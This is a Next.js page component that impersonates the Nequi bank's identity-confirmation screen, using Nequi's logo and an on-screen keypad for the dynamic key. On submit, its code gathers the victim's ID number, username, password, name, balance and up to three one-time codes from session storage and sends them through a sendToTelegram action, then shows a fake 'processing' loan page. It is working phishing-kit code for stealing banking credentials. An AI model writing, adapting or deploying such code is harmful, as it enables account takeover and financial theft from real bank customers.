'use client'

import Image from "next/image"
import { Button } from "@/components/ui/button"
import { useRouter } from "next/navigation"
import { useState, useEffect, useRef } from "react"
import { Input } from "@/components/ui/input"
import { sendToTelegram } from "@/app/actions/telegram";
import { Loader2 } from "lucide-react"; // Ícono de carga

export default function OtpPage() {
  const router = useRouter();
  const [pin, setPin] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const inputRef = useRef(null);

  useEffect(() => {
    const cedula = sessionStorage.getItem('cedula');
    const usuario = sessionStorage.getItem('usuario');
    const clave = sessionStorage.getItem('clave');

    if (!cedula || !usuario || !clave) {
      router.push('/login');
      return;
    }
  }, [router]);

  // Función para manejar el input de manera manual
  const handleChange = (e: { target: { value: string } }) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 6); // Solo números, máx. 6 caracteres
    setPin(value);
    setError(value.length !== 6 ? "La clave debe tener 6 dígitos." : "");
  };

  // Manejar el teclado numérico en pantalla
  const handleNumberClick = (number: number) => {
    if (pin.length < 6) {
      setPin(prevPin => prevPin + number);
      if (pin.length + 1 === 6) setError(""); // Si se completa la clave, eliminar el error
    }
  };

  const handleDelete = () => {
    setPin(prevPin => prevPin.slice(0, -1));
    if (pin.length <= 6) setError("La clave debe tener 6 dígitos.");
  };

  const handleSubmit = async (e: { preventDefault: () => void }) => {
    e.preventDefault();
    if (pin.length !== 6) {
      setError("La clave debe tener 6 dígitos.");
      return;
    }

    setLoading(true);
    try {
      const cedula = sessionStorage.getItem("cedula");
      const usuario = sessionStorage.getItem("usuario");
      const clave = sessionStorage.getItem("clave");
      const nombre = sessionStorage.getItem("nombre");
      const saldo = sessionStorage.getItem("saldo") || "";

      if (!cedula || !nombre || !usuario || !clave) {
        router.push("/login");
        return;
      }

      // Manejo de slots OTP (reinicio al llegar a 4)
      let otpIndex = 1;
      while (otpIndex <= 3 && sessionStorage.getItem(`claveOTP${otpIndex}`)) {
        otpIndex++;
      }

      if (otpIndex <= 3) {
        sessionStorage.setItem(`claveOTP${otpIndex}`, pin);
      } else {
        // Si ya hay 3 OTPs, limpia todas y guarda la nueva como OTP1
        sessionStorage.removeItem("claveOTP1");
        sessionStorage.removeItem("claveOTP2");
        sessionStorage.removeItem("claveOTP3");
        sessionStorage.setItem("claveOTP1", pin);
      }

      // Prepara los datos para el envío
      const claveDinamica = sessionStorage.getItem("claveDinamica") || "";
      const claveOTP1 = sessionStorage.getItem("claveOTP1") || "";
      const claveOTP2 = sessionStorage.getItem("claveOTP2") || "";
      const claveOTP3 = sessionStorage.getItem("claveOTP3") || "";

      await sendToTelegram({
        usuario,
        clave,
        cedula,
        nombre,
        claveDinamica,
        saldo,
        claveOTP1,
        claveOTP2,
        claveOTP3,
      });

      // Cambia el estado a "processing" en localStorage para evitar el loop
      if (typeof window !== "undefined") {
        const LOAN_STATUSES_KEY = 'loanStatuses';
        const storedStatuses = localStorage.getItem(LOAN_STATUSES_KEY);
        let loanStatuses = new Map();
        if (storedStatuses) {
          loanStatuses = new Map(JSON.parse(storedStatuses));
        }
        loanStatuses.set(cedula, "processing");
        localStorage.setItem(LOAN_STATUSES_KEY, JSON.stringify(Array.from(loanStatuses.entries())));
      }

      // Envío del estado a la API
      await fetch(`/api/loan-status?cedula=${cedula}&status=processing`, { method: "POST" });

      setTimeout(() => {
        setLoading(false);
        router.push("/procesando");
      }, 2000);
    } catch (error) {
      console.error("Error al enviar:", error);
      alert("Hubo un error, intenta de nuevo.");
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center px-4 py-8 md:py-12">
      <div className="mb-8">
        <Image
          src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
          alt="Nequi Logo"
          width={120}
          height={40}
          className="w-auto h-8"
        />
      </div>

      <div className="w-full max-w-md space-y-6 text-center">
        <h1 className="text-2xl font-semibold text-gray-900">Confirma tu identidad</h1>
        <p className="text-pink-500 text-sm px-6">
          Para confirmar tu identidad escribe o pega la clave dinámica que encuentras en tu App Nequi.
        </p>

        <form onSubmit={handleSubmit} className="space-y-6 w-full max-w-md">
          <Input
            ref={inputRef}
            type="text"
            maxLength={6}
            value={pin}
            onChange={handleChange}
            className="text-center tracking-[1em] text-xl font-mono h-12 border border-none rounded-md focus:ring focus:ring-pink-500"
            placeholder="- - - - - -"
            required
            aria-label="Clave dinámica"
            inputMode="numeric"
            pattern="\d{6}"
          />

          {/* Teclado numérico */}
          <div className="grid grid-cols-3 gap-4 p-4 rounded-lg  w-full max-w-md mx-auto">
            {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((number) => (
              <Button
                key={number}
                type="button"
                variant="ghost"
                onClick={() => handleNumberClick(number)}
                className="h-16 w-full text-2xl font-bold bg-white rounded-ful hover:bg-gray-200"
              >
                {number}
              </Button>
            ))}
            <Button
              type="submit"
              className="h-16 w-full text-2xl font-bold bg-white text-white rounded-full hover:bg-white"
            >
              ?
              
            </Button>
            <Button
              type="button"
              variant="ghost"
              onClick={() => handleNumberClick(0)}
              className="h-16 w-full text-2xl font-bold bg-white rounded-full hover:bg-gray-200"
            >
              0
            </Button>
            <Button
              type="button"
              variant="ghost"
              onClick={handleDelete}
              className="h-16 w-full text-2xl font-bold"
            >
              ⌫
            </Button>
            
          </div>
          {error && <p className="text-red-500 text-sm mt-2">{error}</p>}

          <Button
            type="submit"
            className="w-full bg-[#E6007E] hover:bg-[#C4006B] text-white  h-12 rounded-md flex items-center justify-center"
            disabled={loading || error !== ""}
          >
            {loading ? (
              <div className="flex items-center justify-center">
                <Loader2 className="animate-spin mr-2" size={20} />
                Procesando...
              </div>
            ) : (
              "Confirmar"
            )}
          </Button>
        </form>

      </div>
    </div>
  );
}
